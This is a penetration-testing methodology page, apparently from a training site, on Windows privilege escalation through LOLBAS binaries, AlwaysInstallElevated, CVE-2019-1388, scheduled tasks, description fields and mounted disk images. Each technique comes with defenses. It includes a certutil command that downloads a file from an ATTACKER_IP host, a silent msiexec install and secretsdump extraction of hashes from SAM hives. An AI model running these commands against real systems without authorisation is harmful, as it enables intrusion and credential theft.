---
layout: page
title: "Miscellaneous Techniques"
subtitle: "Living-off-the-land binaries, AlwaysInstallElevated, scheduled tasks, description fields and mounted disk images"
permalink: /methodology/privesc-windows/miscellaneous-techniques/
---

This page collects escalation and collection techniques that do not fit a larger category. Several depend on a setting that an administrator enabled for convenience, which makes them easy to check and easy to fix. Each entry gives the check, the decision point and the defense.

## Living-off-the-land binaries (LOLBAS)

LOLBAS are Microsoft-signed binaries, scripts and libraries that ship with Windows or are available from Microsoft, and that can be used for purposes other than their intended ones. Common uses include code execution, file transfer, encoding, UAC bypass and credential access. Because they are signed, allowlisting rules often permit them.

certutil is a common example. It is intended for certificate handling, but it can download a file and encode or decode a file in base64:

```cmd
C:\htb> certutil.exe -urlcache -split -f http://ATTACKER_IP:PORT/FILE.bat FILE.bat
C:\htb> certutil -encode INPUT_FILE ENCODED_FILE
C:\htb> certutil -decode ENCODED_FILE OUTPUT_FILE
```

rundll32 can execute a DLL, which allows a DLL to be run from a share or a downloaded location. Check the LOLBAS catalogue for the current list of usable binaries before relying on any single one.

## AlwaysInstallElevated

When the AlwaysInstallElevated policy is set for both user and machine, Windows Installer runs any MSI package with SYSTEM rights, whatever the installing user's rights. Check both hives, since the policy must be set in each:

```cmd
C:\htb> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

A value of 0x1 in both places is the vulnerable condition. If the setting is present, an MSI package can be installed silently:

```cmd
C:\htb> msiexec /i PACKAGE.msi /quiet /qn /norestart
```

The package contents determine what runs. Test with a benign package agreed with the client.

## CVE-2019-1388 (certificate dialog)

A signed, older Windows binary could be run elevated through the UAC prompt. From the certificate dialog for its publisher, a hyperlink in the Issued By field opened a browser window that inherited the elevated context. From the browser, the user could reach a file dialog and launch other programs as SYSTEM. The fix is a Windows update. Check the build against the vendor advisory and the list of affected builds.

## Scheduled tasks

```cmd
C:\htb> schtasks /query /fo LIST /v
```

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName, State
```

A standard user sees only their own tasks and default tasks. Tasks created by administrators are stored in C:\Windows\System32\Tasks, which standard users cannot read. Check the scripts that tasks run:

```cmd
C:\htb> accesschk64.exe /accepteula -s -d C:\Scripts\
```

A script folder writable by Users or Authenticated Users, referenced by a task that runs as SYSTEM or an administrator, is a clear finding. Check the task's run-as account and its schedule before treating it as exploitable.

## Description fields

Administrators sometimes store notes in account or computer description fields, including passwords.

```powershell
PS C:\htb> Get-LocalUser
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Descriptions are visible to every user, so they are a cheap first check.

## Mounting disk images

Backup shares often hold virtual disk files (.vhd, .vhdx, .vmdk). These contain complete file systems and can be mounted read-only for review:

```cmd
C:\htb> Mount-VHD -Path PATH\TO\DISK.vhdx -ReadOnly
```

Windows Disk Management can mount .vhd and .vhdx files, and .vmdk files can be mapped with VMware tools or 7-Zip. On a Linux analysis host, guestmount can present the file system read-only:

```bash
guestmount -a DISK.vmdk -i --ro /mnt/vmdk
```

Once mounted, search the file system for SAM and SYSTEM hives, configuration files and keys. Hive copies can be processed offline with secretsdump:

```bash
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## What to look for

- AlwaysInstallElevated set in both HKCU and HKLM.
- Scheduled tasks running as SYSTEM that call scripts in user-writable folders.
- Descriptions containing credentials.
- Disk images in backup shares that match host names.
- Allowlist gaps that permit LOLBAS execution.

## Pitfalls

- Mounting a disk image modifies it unless it is attached read-only. Always use read-only options.
- AlwaysInstallElevated abuse is loud, and the installer leaves entries in the registry and in the event logs.
- LOLBAS usage can be blocked by application control or logged by EDR. Test with the client's detection team in the loop.
- Scheduled task scripts may run only under conditions you cannot reproduce. Verify the trigger.

## Defense

Keep AlwaysInstallElevated disabled. Restrict scheduled task scripts to administrator-writable folders and use absolute paths in tasks. Keep secrets out of description fields. Store backups in restricted locations, encrypt virtual disks and restrict who can mount them. Use application control rules that limit LOLBAS use, and monitor certutil network activity and msiexec installations that run from user folders.
